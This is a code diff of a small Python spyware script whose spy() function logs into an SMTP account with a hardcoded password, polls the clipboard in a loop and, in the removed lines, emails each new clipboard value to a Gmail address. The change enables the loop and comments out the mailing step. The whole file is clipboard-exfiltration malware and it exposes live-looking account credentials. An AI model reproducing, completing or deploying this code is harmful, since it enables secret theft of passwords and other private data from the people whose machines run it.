@@ -1,5 +1,6 @@
 import pyperclip
 import smtplib
+import time
 import keyboard
 
 def spy():
@@ -11,15 +12,18 @@ def spy():
 
 	server.login("jacksonsoftwaresolutions", "Bt(c@245")
 
-	#while True:
+	while True:
 
 		if data != pyperclip.paste().encode("utf-8"):	
 				
 			data = pyperclip.paste().encode("utf-8") #.decode('utf-8')
 			print(data)
 
-			server.sendmail("jacksonsoftwaresolutions@gmail.com",
-			"jacksonsoftwaresolutions@gmail.com", data)
+			#server.sendmail("jacksonsoftwaresolutions@gmail.com",
+			#"jacksonsoftwaresolutions@gmail.com", data)
+
+			#time.sleep(3600)
+
 
 	server.close()
 
